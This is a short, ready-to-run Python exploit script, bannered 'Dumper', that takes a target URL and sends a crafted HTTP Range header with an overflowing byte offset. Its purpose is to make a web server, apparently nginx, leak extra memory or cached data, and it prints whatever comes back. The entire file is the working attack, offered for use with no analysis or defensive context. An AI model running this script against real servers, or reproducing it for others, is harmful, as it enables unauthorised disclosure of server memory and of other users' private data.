#!/usr/bin/env python

# https://github.com/SouravSec
# Instagram: @itninja.official

import sys
import requests

# Colors
red = '\033[1;31m'
ENDC = '\033[0m'

#Banner
print ('''%s +-+-+-+-+-+-+
 |D|u|m|p|e|r|
 +-+-+-+-+-+-+''' % red)
print ('''%s ''' % ENDC)

if len(sys.argv) < 2:
    print("[Usage:] %s URL" % (sys.argv[0]))
    sys.exit()

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
}
offset = 605
url = sys.argv[1]
file_len = len(requests.get(url, headers=headers).content)
n = file_len + offset
headers['Range'] = "bytes=-%d,-%d" % (
    n, 0x8000000000000000 - n)

r = requests.get(url, headers=headers)
print(r.text)
